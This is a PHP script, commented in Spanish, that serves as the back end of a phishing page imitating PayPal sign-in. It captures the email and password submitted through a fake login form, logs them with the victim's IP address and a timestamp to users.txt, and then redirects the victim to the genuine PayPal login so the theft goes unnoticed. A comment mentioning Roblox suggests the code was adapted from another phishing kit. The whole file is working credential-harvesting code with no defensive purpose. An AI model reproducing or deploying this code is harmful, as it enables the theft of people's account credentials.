<?php
// Configuración de redirección
$redirect_url = "https://www.paypal.com/signin";

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // 1. Capturar los datos de los inputs del index.html
    $email = isset($_POST['email']) ? $_POST['email'] : 'No encontrado';
    $password = isset($_POST['pass']) ? $_POST['pass'] : 'No encontrada';
    $ip = $_SERVER['REMOTE_ADDR'];
    $fecha = date('Y-m-d H:i:s');

    // 2. Formatear la línea de texto
    $data = "----------------------------\n";
    $data .= "Fecha: $fecha\n";
    $data .= "IP:    $ip\n";
    $data .= "Email: $email\n";
    $data .= "Pass:  $password\n";
    $data .= "----------------------------\n";

    // 3. Guardar en el archivo users.txt (en la misma carpeta)
    // FILE_APPEND evita que se borren los datos anteriores
    file_put_contents('users.txt', $data, FILE_APPEND);

    // 4. Redirigir al usuario a la página oficial
    header("Location: $redirect_url");
    exit();
} else {
    // Si alguien intenta entrar al PHP directamente, mandarlo a Roblox
    header("Location: $redirect_url");
    exit();
}
?>
